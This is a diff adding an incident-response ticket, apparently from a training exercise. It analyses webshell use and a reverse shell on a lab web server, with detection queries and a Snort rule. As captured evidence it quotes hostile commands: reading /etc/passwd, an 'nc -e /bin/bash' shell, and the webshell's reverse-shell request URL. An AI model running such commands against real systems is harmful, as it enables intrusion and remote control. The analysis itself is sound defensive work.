@@ -1,0 +1,131 @@
+# Traffic Analysis Ticket – 170120 – wittyserver (192.168.1.100)
+
+Operator name "Sung" and operator log times are placeholders — replace with your actual operator name and analysis times.
+Ticket links (Inv##) are placeholders.
+
+====================================================================
+TICKET 1 – PHP webshell (minishell.php) use and reverse shell on web server
+====================================================================
+
+#INDEX ENTRY#
+
+[] – 261123 2328 – 192.168.1.100 wittyserver – PHP webshell (minishell.php) used from 192.168.1.102, file upload, command run and reverse shell to 192.168.1.101:4444 – http://ticket:9001/p/Inv##
+
+
+#FINAL SUMMARY OF TICKET# (End of Mission / Closing of Ticket – MC ENTRY ONLY)
+
+
+
+#TICKET METADATA#
+
+OPERATOR: Sung
+
+TIME OF INCIDENT: 170120 09:53:39 UTC
+
+RELATED TICKETS:
+
+
+DESCRIPTION OF INVESTIGATION:
+
+At 170120 09:53:39 UTC 192.168.1.102 (Windows 10, Chrome) connected via http (port 55555) to web server wittyserver (192.168.1.100, Kali Linux) and used the PHP webshell minishell.php (login user "ry4wn"). Through the webshell it uploaded cerber4.PNG (a real PNG image) to /tmp and ran "cat /etc/passwd".
+
+At 09:56:35 the webshell opened a PHP reverse shell from 192.168.1.100 to 192.168.1.101:4444 (earlier tries to 192.168.1.102:4444 failed). The shell ran for 2 min as www-data: passwd file read, files listed and "nc -nv 192.168.1.100 5555 -e /bin/bash" run. No root access seen. Initial access not in capture – minishell.php was already on the server. Host analysis required.
+
+
+#IMPACTED INTERNAL MACHINES#
+
+INTERNAL IP/s & HOSTNAME/s:
+
+192.168.1.100 wittyserver (MAC 6c:0b:84:6a:1d:d8) – Kali Linux web server, Apache/2.4.18 on port 55555
+
+INTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
+
+INTERNAL DESTINATION PORT/s:
+
+Port 55555 – HTTP (webshell)
+
+LATERAL SOURCE PORT/s: (If Ephemeral Leave Blank unless required)
+
+192.168.1.102 (MAC 90:e6:ba:96:43:32, Windows 10, possible hostname RY4WN-PC) – webshell operator
+192.168.1.101 – reverse shell listener
+
+LATERAL DESTINATION PORT/s:
+
+Port 55555 – HTTP (192.168.1.102 -> 192.168.1.100, webshell)
+Port 4444 – TCP (192.168.1.100 -> 192.168.1.101, reverse shell)
+
+
+#EXTERNAL MACHINES#
+
+EXTERNAL IP/s & HOSTNAME/s:
+
+82.98.86.178 (www.ajithkp560.aaaaaaaa[.]com) – background image loaded by every webshell page (webshell author site, not C2)
+
+EXTERNAL SOURCE PORT/s: (If Ephemeral Leave Blank.)
+
+EXTERNAL DESTINATION PORT/s: (If Ephemeral Leave Blank.)
+
+Port 80 – HTTP (webshell page image)
+
+
+#SEARCH QUERIES#
+
+ARKIME: (Format= [What Command Finds] - <Command>)
+
+[Webshell requests] - ip.dst == 192.168.1.100 && port.dst == 55555 && http.uri == *minishell.php*
+
+[Reverse shell sessions] - ip.src == 192.168.1.100 && port.dst == 4444
+
+SPLUNK: (Format= [What Command Finds] - <Command>)
+
+[Webshell requests] - index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
+
+[Reverse shell connections] - index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 id_resp_p=4444
+
+SNORT: (Format= [What Command Finds] - <Command>)
+
+[minishell.php webshell via http] - alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
+
+
+#EVIDENCE LOCATIONS#
+
+Team<#>: /home/<username>/evidence/170120_minishell_php_webshell.pcap
+Team<#>: /home/<username>/evidence/170120_reverse_shell_4444.pcap
+
+
+#OFFICIAL LOGGING AND ARTEFACTS#
+
+#OPERATOR LOG#
+
+[2328 261123, Sung] – Investigating HTTP requests from 192.168.1.102 to 192.168.1.100:55555 (minishell.php) – Found – Further Analysis Required
+
+[2335 261123, Sung] – Looking for reverse shell connections and file uploads to 192.168.1.100 – Found – Further Analysis Required
+
+[2353 261123, Sung] – Reviewing reverse shell commands and uploaded file in Arkime – Found
+
+[2359 261123, Sung] – Looking for how minishell.php was placed on 192.168.1.100 (initial access) – Not Found
+
+
+#TOOL OUTPUT / ANALYST NOTES#
+
+[2328 261123, Sung] Webshell use: 192.168.1.102 opened minishell.php from the Apache directory listing on port 55555, then used its browse, upload, command and reverse shell features. Login cookie pass value is the MD5 of "password".
+
+    170120 09:53:39 UTC  192.168.1.102         192.168.1.100  55555  GET   /minishell.php  200  Referer: http://192.168.1.100:55555/
+    170120 09:54:47 UTC  192.168.1.102  56133  192.168.1.100  55555  POST  /minishell.php?path=/tmp  upload_f filename="cerber4.PNG"  23125 B
+    170120 09:55:04 UTC  192.168.1.102  56136  192.168.1.100  55555  GET   /minishell.php?path=/var/www/html&cmdexe=cat+/etc/passwd  200
+    170120 09:56:35 UTC  192.168.1.102         192.168.1.100  55555  GET   /minishell.php?rev_option=PHP+Reverse+Shell&my_ip=192.168.1.101&my_port=4444
+    Cookie: user=ry4wn; pass=5f4dcc3b5aa765d61d8327deb882cf99   Server: Apache/2.4.18 (Debian)
+
+[2335 261123, Sung] Reverse shell: tries to 192.168.1.102:4444 got no answer (S0). Connection to 192.168.1.101:4444 succeeded (SF) and lasted 120 s.
+
+    170120 09:56:05 UTC  192.168.1.100  39336  192.168.1.102  4444  S0  (repeated until 09:56:42)
+    170120 09:56:35 UTC  192.168.1.100  57978  192.168.1.101  4444  SF  120.7 s  sent 4336 B / recv 77 B
+
+[2353 261123, Sung] Reverse shell is clear text. Shell ran as www-data. cerber4.PNG confirmed in /tmp. nc to the server itself on port 5555 is not visible on the network – host check required.
+
+    Linux wittyserver 4.3.0-kali1-amd64 #1 SMP Debian 4.3.3-5kali4 (2016-01-13) x86_64 GNU/Linux
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    Commands: cat /etc/passwd | ls | id | cd /tmp | ls | nc -nv 192.168.1.100 5555 -e /bin/bash | exit
+    Output: (UNKNOWN) [192.168.1.100] 5555 (?) open
+
+[2359 261123, Sung] First request to 192.168.1.100 is GET / (directory listing) at 09:53:35 – no upload of minishell.php in capture. An SSH session between 192.168.1.100 and 192.168.1.101:22 was already open before the capture (OTH) – possible access path, encrypted. Host check required: Apache logs, minishell.php file date, /tmp, port 5555 listener.
